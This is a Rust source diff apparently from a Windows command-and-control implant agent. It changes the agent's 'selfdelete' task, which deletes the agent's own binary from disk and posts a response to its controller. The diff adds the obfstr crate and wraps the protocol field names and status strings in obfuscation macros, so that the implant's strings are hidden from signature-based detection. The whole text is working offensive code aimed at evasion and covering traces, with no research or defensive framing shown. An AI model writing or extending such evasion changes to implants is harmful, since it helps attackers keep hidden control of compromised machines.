@@ -1,4 +1,5 @@
 use crate::transport;
+use obfstr::obfstr;
 
 use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
@@ -127,7 +128,7 @@ fn delete_self_from_disk() -> bool {
 
 pub fn selfdelete(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
     let id = task.get("id").unwrap().as_str().unwrap();
-    let timestamp = task.get("timestamp").unwrap().as_f64().unwrap();
+    let timestamp = task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap();
 
     crate::helpers::churn(id);
 
@@ -140,14 +141,14 @@ pub fn selfdelete(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
     };
 
     let response_json = serde_json::json!({
-        "action": "post_response",
-        "responses": [
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [
             {
-                "task_id": id,
-                "user_output": output,
-                "timestamp": timestamp,
-                "status": if success { "success" } else { "error" },
-                "completed": true,
+                obfstr!("task_id"): id,
+                obfstr!("user_output"): output,
+                obfstr!("timestamp"): timestamp,
+                obfstr!("status"): if success { obfstr!("success") } else { "error" },
+                obfstr!("completed"): true,
             }
         ]
     });
